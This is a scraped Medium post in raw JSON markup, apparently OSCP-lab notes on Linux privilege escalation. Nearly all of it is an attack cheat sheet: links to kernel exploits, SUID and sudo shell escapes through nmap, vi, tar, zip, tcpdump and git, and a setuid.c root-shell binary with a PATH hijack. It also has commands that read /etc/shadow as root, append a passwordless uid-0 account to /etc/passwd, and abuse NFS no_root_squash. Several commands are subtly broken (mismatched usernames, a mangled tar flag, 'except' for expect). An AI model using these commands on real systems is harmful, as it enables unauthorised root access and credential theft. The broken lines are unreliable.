https:\\u002F\\u002Fblog.g0tmi1k.com\\u002F2011\\u002F08\\u002Fbasic-linux-privilege-escalation\\u002F","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[{"\_\_typename":"Markup","start":243,"end":250,"type":"A","href":"https:\\u002F\\u002Fblog.g0tmi1k.com\\u002F2011\\u002F08\\u002Fbasic-linux-privilege-escalation\\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":316,"end":382,"type":"A","href":"https:\\u002F\\u002Fblog.g0tmi1k.com\\u002F2011\\u002F08\\u002Fbasic-linux-privilege-escalation\\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":243,"end":250,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_3":{"id":"600154e55c0b\_3","\_\_typename":"Paragraph","name":"e285","text":"\\\\x01 Kernel Exploit","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_4":{"id":"600154e55c0b\_4","\_\_typename":"Paragraph","name":"8a5a","text":"For kernel exploit, you have to identify the kernel version and what distribution you used. You can type the following command to do it, and then search any related exploits on exploit DB, wget it, fix it, compile it and execute it. Here comes the commands to identify the kernel version and your distribution:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[{"\_\_typename":"Markup","start":177,"end":187,"type":"A","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_5":{"id":"600154e55c0b\_5","\_\_typename":"Paragraph","name":"642e","text":"$ uname -a\\n$ cat \\u002Fetc\\u002Fissue\\n$ cat \\u002Fetc\\u002F\*-release\\n$ cat \\u002Fetc\\u002Flsb-release\\n$ cat \\u002Fetc\\u002Fredhat-release\\n$ lsb\_release","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_6":{"id":"600154e55c0b\_6","\_\_typename":"Paragraph","name":"8e82","text":"In most cases, you can use sendpage and dirtycow both kernel exploits to do privilege escalation. And I would like to list two kernel exploits worth mentioned here.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[{"\_\_typename":"Markup","start":27,"end":35,"type":"A","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F9641","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":40,"end":48,"type":"A","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F40839","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":27,"end":35,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":40,"end":48,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_7":{"id":"600154e55c0b\_7","\_\_typename":"Paragraph","name":"b6a0","text":"The first one is udev kernel exploit. You can refer the following Mad Irish’s article.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_8":{"id":"600154e55c0b\_8","\_\_typename":"Paragraph","name":"b434","text":"Udev Exploit Allows Local Privilege Escalation\\nA nasty new udev vulnerability is floating around in the wild that allows local users on Linux systems with udev and…www.madirish.net","type":"MIXTAPE\_EMBED","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":{"\_\_typename":"MixtapeMetadata","href":"http:\\u002F\\u002Fwww.madirish.net\\u002F370","thumbnailImageId":"0\*YSg8Iq9P8pbfSz1q"},"markups":\[{"\_\_typename":"Markup","start":0,"end":180,"type":"A","href":"http:\\u002F\\u002Fwww.madirish.net\\u002F370","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":0,"end":46,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":47,"end":164,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_9":{"id":"600154e55c0b\_9","\_\_typename":"Paragraph","name":"9410","text":"The second one is regarding ReiserFS xattr vulnerability. If you see any folder mounted with reiserfs file system with xattr attribute set, it’s worth to give it a try. Here comes the reference link:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_10":{"id":"600154e55c0b\_10","\_\_typename":"Paragraph","name":"cc4c","text":"Offensive Security's Exploit Database Archive\\nusr\\u002Fbin\\u002Fenv python ''' team-edward.py Linux Kernel http:\\u002F\\u002Fjon.oberheide.org Information…www.exploit-db.com","type":"MIXTAPE\_EMBED","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":{"\_\_typename":"MixtapeMetadata","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F12130","thumbnailImageId":"0\*eHAJUEu4D7PbFzqm"},"markups":\[{"\_\_typename":"Markup","start":0,"end":152,"type":"A","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F12130","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":0,"end":45,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":46,"end":134,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_11":{"id":"600154e55c0b\_11","\_\_typename":"Paragraph","name":"51bf","text":"\\\\x02 Exploit the service running as root","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_12":{"id":"600154e55c0b\_12","\_\_typename":"Paragraph","name":"a020","text":"There are 2 cases I encountered in OSCP lab are Samba 2.2.x and MySQL.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_13":{"id":"600154e55c0b\_13","\_\_typename":"Paragraph","name":"c1a8","text":"For Samba 2.2.x, please check the following link:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_14":{"id":"600154e55c0b\_14","\_\_typename":"Paragraph","name":"b8aa","text":"Offensive Security's Exploit Database Archive\\nSamba \\u003C 2.2.8 (Linux\\u002FBSD) - Remote Code Execution. CVE-4469CVE-2003-0201 . remote exploit for Multiple platformwww.exploit-db.com","type":"MIXTAPE\_EMBED","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":{"\_\_typename":"MixtapeMetadata","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F10","thumbnailImageId":"0\*pAZ2KDqBXq8ymiji"},"markups":\[{"\_\_typename":"Markup","start":0,"end":175,"type":"A","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F10","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":0,"end":45,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":46,"end":157,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_15":{"id":"600154e55c0b\_15","\_\_typename":"Paragraph","name":"dbeb","text":"For MySQL, if there is mysql daemon running as root, you could utilize UDF (User Define Function) to get root shell.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_16":{"id":"600154e55c0b\_16","\_\_typename":"Paragraph","name":"af52","text":"Offensive Security's Exploit Database Archive\\nMySQL 4.x\\u002F5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2).. local exploit for Linux platformwww.exploit-db.com","type":"MIXTAPE\_EMBED","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":{"\_\_typename":"MixtapeMetadata","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F1518","thumbnailImageId":"0\*aiIA1B5UXeccqAts"},"markups":\[{"\_\_typename":"Markup","start":0,"end":170,"type":"A","href":"https:\\u002F\\u002Fwww.exploit-db.com\\u002Fexploits\\u002F1518","anchorType":"LINK","userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":0,"end":45,"type":"STRONG","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":46,"end":152,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_17":{"id":"600154e55c0b\_17","\_\_typename":"Paragraph","name":"0626","text":"\\\\x03 Find anything with SUID \\u002F SGID permission","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_18":{"id":"600154e55c0b\_18","\_\_typename":"Paragraph","name":"ac74","text":"Use the following 2 commands:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_19":{"id":"600154e55c0b\_19","\_\_typename":"Paragraph","name":"2fd2","text":"$ find \\u002F -user root -perm -4000 2\\u003E\\u002Fdev\\u002Fnull\\n$ find \\u002F -perm -2000 2\\u003E\\u002Fdev\\u002Fnull","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_20":{"id":"600154e55c0b\_20","\_\_typename":"Paragraph","name":"6006","text":"If you find the following command with SUID\\u002FSGID permission, perfect, you almost win.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_21":{"id":"600154e55c0b\_21","\_\_typename":"Paragraph","name":"d233","text":"nmap","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_22":{"id":"600154e55c0b\_22","\_\_typename":"Paragraph","name":"6136","text":"$ nmap --interactive\\nnmap\\u003E !sh","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_23":{"id":"600154e55c0b\_23","\_\_typename":"Paragraph","name":"69a1","text":"Another way below (if nmap doesn’t have interactive mode):\\n($ echo “os.execute(‘\\u002Fbin\\u002Fsh’)” \\u003E \\u002Ftmp\\u002Fshell.nse)\\n($ sudo nmap --script=\\u002Ftmp\\u002Fshell.nse)","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_24":{"id":"600154e55c0b\_24","\_\_typename":"Paragraph","name":"b873","text":"vi","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_25":{"id":"600154e55c0b\_25","\_\_typename":"Paragraph","name":"57fa","text":"$ vi\\n:!sh","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_26":{"id":"600154e55c0b\_26","\_\_typename":"Paragraph","name":"c72e","text":"find","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_27":{"id":"600154e55c0b\_27","\_\_typename":"Paragraph","name":"3634","text":"$ find \\u002F home -exec sh -i \\\\;","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_28":{"id":"600154e55c0b\_28","\_\_typename":"Paragraph","name":"4a61","text":"python","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_29":{"id":"600154e55c0b\_29","\_\_typename":"Paragraph","name":"16f0","text":"$ python -c ‘import pty;pty.spawn(“\\u002Fbin\\u002Fsh”)’","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_30":{"id":"600154e55c0b\_30","\_\_typename":"Paragraph","name":"745b","text":"strace","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_31":{"id":"600154e55c0b\_31","\_\_typename":"Paragraph","name":"c61c","text":"$ strace -o \\u002Fdev\\u002Fnull \\u002Fbin\\u002Fsh","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_32":{"id":"600154e55c0b\_32","\_\_typename":"Paragraph","name":"aaee","text":"tcpdump","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_33":{"id":"600154e55c0b\_33","\_\_typename":"Paragraph","name":"b333","text":"$ echo $’id\\\\ncat \\u002Fetc\\u002Fshadow’ \\u003E \\u002Ftmp\\u002F.shell\\n$ chmod +x \\u002Ftmp\\u002F.shell\\n$ tcpdump -ln -i eth0 -w \\u002Fdev\\u002Fnull -W 1 -G 1 -z \\u002Ftmp\\u002F.shell -Z root","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_34":{"id":"600154e55c0b\_34","\_\_typename":"Paragraph","name":"9157","text":"If you find out one script file with SUID permission, owned by root and executable by others, and this script file will execute some commands. You can play the trick to get root shell. For example here, this script will execute scp command transferring some backup file to somewhere. Add . into $PATH and compile setuid.c, rename the compiled binary to scp and put it under current folder. And then run that script.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[{"\_\_typename":"Markup","start":228,"end":231,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_35":{"id":"600154e55c0b\_35","\_\_typename":"Paragraph","name":"5e75","text":"$ export PATH=.:$PATH\\n$ cat setuid.c\\n#include \\u003Cstdio.h\\u003E\\nint main(void)\\n{\\nsetuid(0); setgid(0); seteuid(0); setegid(0); execvp(“\\u002Fbin\\u002Fsh”, NULL, NULL);\\n}\\n$ mv setuid scp\\n$ .\\u002Fscript.sh","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_36":{"id":"600154e55c0b\_36","\_\_typename":"Paragraph","name":"5789","text":"\\\\x04 Abuse SUDO","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_37":{"id":"600154e55c0b\_37","\_\_typename":"Paragraph","name":"531a","text":"Use the following command to show which command have allowed to the current user.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_38":{"id":"600154e55c0b\_38","\_\_typename":"Paragraph","name":"42f7","text":"$ sudo -l","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_39":{"id":"600154e55c0b\_39","\_\_typename":"Paragraph","name":"c026","text":"And if you find the following command with NOPASSWD and root set in the output. You win again !!!\\nzip","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_40":{"id":"600154e55c0b\_40","\_\_typename":"Paragraph","name":"42d2","text":"$ sudo zip \\u002Ftmp\\u002Ftest.zip \\u002Ftmp\\u002Ftest -T --unzip-command=”sh -c \\u002Fbin\\u002Fbash”","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_41":{"id":"600154e55c0b\_41","\_\_typename":"Paragraph","name":"aa3a","text":"tar","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_42":{"id":"600154e55c0b\_42","\_\_typename":"Paragraph","name":"787a","text":"$ sudo tar cf \\u002Fdev\\u002Fnull testfile --checkpoint=1 — checkpointaction=exec=\\u002Fbin\\u002Fbash","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_43":{"id":"600154e55c0b\_43","\_\_typename":"Paragraph","name":"ed23","text":"strace","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_44":{"id":"600154e55c0b\_44","\_\_typename":"Paragraph","name":"c2f1","text":"$ sudo strace -o\\u002Fdev\\u002Fnull \\u002Fbin\\u002Fbash","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_45":{"id":"600154e55c0b\_45","\_\_typename":"Paragraph","name":"6eb6","text":"tcpdump","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_46":{"id":"600154e55c0b\_46","\_\_typename":"Paragraph","name":"43af","text":"$ echo $’id\\\\ncat \\u002Fetc\\u002Fshadow’ \\u003E \\u002Ftmp\\u002F.shell\\n$ chmod +x \\u002Ftmp\\u002F.shell\\n$ sudo tcpdump -ln -i eth0 -w \\u002Fdev\\u002Fnull -W 1 -G 1 -z \\u002Ftmp\\u002F.shell -Z root","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_47":{"id":"600154e55c0b\_47","\_\_typename":"Paragraph","name":"71e4","text":"nmap","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_48":{"id":"600154e55c0b\_48","\_\_typename":"Paragraph","name":"5c00","text":"$ echo “os.execute(‘\\u002Fbin\\u002Fsh’)” \\u003E \\u002Ftmp\\u002Fshell.nse\\n$ sudo nmap --script=\\u002Ftmp\\u002Fshell.nse","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_49":{"id":"600154e55c0b\_49","\_\_typename":"Paragraph","name":"ad13","text":"Another way below:\\n($ sudo nmap --interactive\\nnmap\\u003E !sh)","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_50":{"id":"600154e55c0b\_50","\_\_typename":"Paragraph","name":"e98c","text":"scp","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_51":{"id":"600154e55c0b\_51","\_\_typename":"Paragraph","name":"0778","text":"$ sudo scp -S \\u002Fpath\\u002Fto\\u002Fyour\\u002Fscript x y","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_52":{"id":"600154e55c0b\_52","\_\_typename":"Paragraph","name":"1326","text":"except","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_53":{"id":"600154e55c0b\_53","\_\_typename":"Paragraph","name":"f9c0","text":"$ sudo except spawn sh then sh","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_54":{"id":"600154e55c0b\_54","\_\_typename":"Paragraph","name":"ace0","text":"nano","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_55":{"id":"600154e55c0b\_55","\_\_typename":"Paragraph","name":"2866","text":"$ sudo nano -S \\u002Fbin\\u002Fbash","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_56":{"id":"600154e55c0b\_56","\_\_typename":"Paragraph","name":"b856","text":"git","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_57":{"id":"600154e55c0b\_57","\_\_typename":"Paragraph","name":"f1bd","text":"$ sudo git help status\\n: !\\u002Fbin\\u002Fbash","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_58":{"id":"600154e55c0b\_58","\_\_typename":"Paragraph","name":"fc32","text":"gdb\\u002Fftp","type":"H4","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_59":{"id":"600154e55c0b\_59","\_\_typename":"Paragraph","name":"a127","text":"$ sudo ftp\\n: !\\u002Fbin\\u002Fsh","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_60":{"id":"600154e55c0b\_60","\_\_typename":"Paragraph","name":"0ff1","text":"\\\\x05 Find any writable file owned by root","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_61":{"id":"600154e55c0b\_61","\_\_typename":"Paragraph","name":"af69","text":"Please use the following command to find any writable files owned by root. You might be able to see the script file and add the needed command for your privilege escalation.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_62":{"id":"600154e55c0b\_62","\_\_typename":"Paragraph","name":"a994","text":"$ find \\u002F -perm -002 -user root -type f -not-path “\\u002Fproc\\u002F\*” 2\\u003E\\u002Fdev\\u002Fnull","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_63":{"id":"600154e55c0b\_63","\_\_typename":"Paragraph","name":"0ba4","text":"\\\\x06 Check \\u002Fetc\\u002Fpasswd if writable","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_64":{"id":"600154e55c0b\_64","\_\_typename":"Paragraph","name":"9f77","text":"If you see \\u002Fetc\\u002Fpasswd is writable, the only thing you should do is to echo one line to \\u002Fetc\\u002Fpassed","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_65":{"id":"600154e55c0b\_65","\_\_typename":"Paragraph","name":"5da6","text":"$ echo “tseruser::0:0:pawned:\\u002Froot:\\u002Fbin\\u002Fbash” \\u003E\\u003E \\u002Fetc\\u002Fpasswd\\n$ su testuser","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_66":{"id":"600154e55c0b\_66","\_\_typename":"Paragraph","name":"0080","text":"\\\\x07 NFS root squashing","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_67":{"id":"600154e55c0b\_67","\_\_typename":"Paragraph","name":"9b65","text":"According Wikipedia, root squash is a special mapping of the remote superuser (root) identity when using identity authentication (local user is the same as remote user). Under root squash, a client’s uid 0 (root) is mapped to 65534 (nobody). It is primarily a feature of NFS but may be available on other systems as well.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_68":{"id":"600154e55c0b\_68","\_\_typename":"Paragraph","name":"6279","text":"In the scenario which you use showmount to find your target has NFS service up and running and you’re already in via anyway and you find you have the permission to edit \\u002Fetc\\u002Fexports as well, for example, you can use sudoedit to edit \\u002Fetc\\u002Fexports. You can put no\_root\_squash to disable root squash. Please see below:","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[{"\_\_typename":"Markup","start":30,"end":39,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":169,"end":181,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":216,"end":224,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_69":{"id":"600154e55c0b\_69","\_\_typename":"Paragraph","name":"33bf","text":"\\u002Fhome\\u002Fuserfolder \*(rw,no\_root\_squash)","type":"BQ","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_70":{"id":"600154e55c0b\_70","\_\_typename":"Paragraph","name":"a269","text":"And then you can mount this folder with local root and put the copy of \\u002Fbin\\u002Fbash into it. After this, try use the exploited normal account to execute this \\u002Fbin\\u002Fbash. You will get the heaven !!!","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[{"\_\_typename":"Markup","start":17,"end":22,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":71,"end":80,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"\_\_typename":"Markup","start":155,"end":164,"type":"EM","href":null,"anchorType":null,"userId":null,"linkMetadata":null}\],"dropCapImage":null},"Paragraph:600154e55c0b\_71":{"id":"600154e55c0b\_71","\_\_typename":"Paragraph","name":"21dc","text":"\\\\x08 Useful tools","type":"H3","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_72":{"id":"600154e55c0b\_72","\_\_typename":"Paragraph","name":"ea34","text":"In the final section, I will introduce 3 useful tools for your PE. These tools can check and enumerate your target, show rich information for your PE on Linux platform.","type":"P","href":null,"layout":null,"metadata":null,"hasDropCap":null,"iframe":null,"mixtapeMetadata":null,"markups":\[\],"dropCapImage":null},"Paragraph:600154e55c0b\_73":{"id":"600154e55c0b\_73","\_\_typename":"Paragraph","name":"3c84","text":"rebootuser\\u002FLinEnum\\nFor more information visit www.rebootuser.com Note: Export functionality is currently in the experimental 